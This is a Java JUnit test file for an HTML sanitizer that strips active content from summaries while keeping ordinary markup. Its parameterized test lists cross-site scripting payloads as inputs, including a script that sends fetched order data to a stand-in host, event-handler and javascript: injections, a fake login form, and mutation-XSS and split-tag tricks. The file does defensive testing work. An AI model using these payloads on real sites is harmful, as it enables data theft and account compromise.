package io.gate.prompt.html;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.Locale;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class HtmlGuardTest {

    @Test
    void ordinarySummaryIsKeptAsIs() {
        String summary = "<p>Customers like the <b>battery</b>.</p><ul><li>Fast delivery</li><li>Sturdy</li></ul>";
        HtmlGuard.Result r = HtmlGuard.sanitize(summary);
        assertEquals(summary, r.html());
        assertFalse(r.changed());
    }

    @Test
    void textWithAnglesAndQuotesStaysText() {
        // 정상 리뷰에 흔한 글자: 오탐(내용 손상) 없이 글자로 보여야 한다
        HtmlGuard.Result r = HtmlGuard.sanitize("<p>Size 3 < 5 and \"fits\" well & it's cheap</p>");
        assertTrue(r.html().contains("3 &lt; 5"), r.html());
        assertTrue(r.html().contains("fits") && r.html().contains("cheap"), r.html());
        assertFalse(r.dangerousContentRemoved());
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>fetch('/api/orders').then(r=>r.text()).then(t=>new Image().src='//x.invalid/?'+t)</script>",
        "<img src=x onerror=alert(1)>",
        "<p onclick=\"steal()\">Click</p>",
        "<a href=\"javascript:alert(1)\">Details</a>",
        "<a href=\"https://login.example.invalid\">Log in again</a>",
        "<iframe src=\"//x.invalid\"></iframe>",
        "<svg onload=alert(1)>",
        "<style>body{display:none}</style>",
        "<form action=\"//x.invalid\"><input name=password></form>",
        "<p style=\"position:fixed;top:0\">Fake banner</p>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    })
    void activeContentIsRemoved(String attack) {
        HtmlGuard.Result r = HtmlGuard.sanitize(attack);
        String lower = r.html().toLowerCase(Locale.ROOT);
        for (String bad : new String[] {"<script", "<img", "<a ", "<iframe", "<svg", "<style", "<form", "<input",
            "onerror", "onclick", "onload", "javascript:", "href", "src=", "style="}) {
            assertFalse(lower.contains(bad), () -> attack + " -> " + r.html());
        }
        assertTrue(r.dangerousContentRemoved(), () -> attack + " -> " + r);
    }

    @Test
    void splitTagObfuscationLeavesOnlyText() {
        // "<scr<script>ipt>": 지운 뒤 다시 합쳐져 script가 되지 않는다 (남는 것은 이스케이프된 글자뿐)
        HtmlGuard.Result r = HtmlGuard.sanitize("<scr<script>ipt>alert(1)</script>");
        assertFalse(r.html().toLowerCase(Locale.ROOT).contains("<script"), r.html());
        assertFalse(r.html().contains("<"), r.html());
        assertTrue(r.changed());
    }

    @Test
    void scriptBodyIsNotKeptAsText() {
        HtmlGuard.Result r = HtmlGuard.sanitize("<p>ok</p><script>secretAction()</script>");
        assertEquals("<p>ok</p>", r.html());
        assertEquals(java.util.List.of("script"), r.removedTags());
    }

    @Test
    void emptyInputIsEmpty() {
        assertEquals("", HtmlGuard.sanitize(null).html());
    }
}
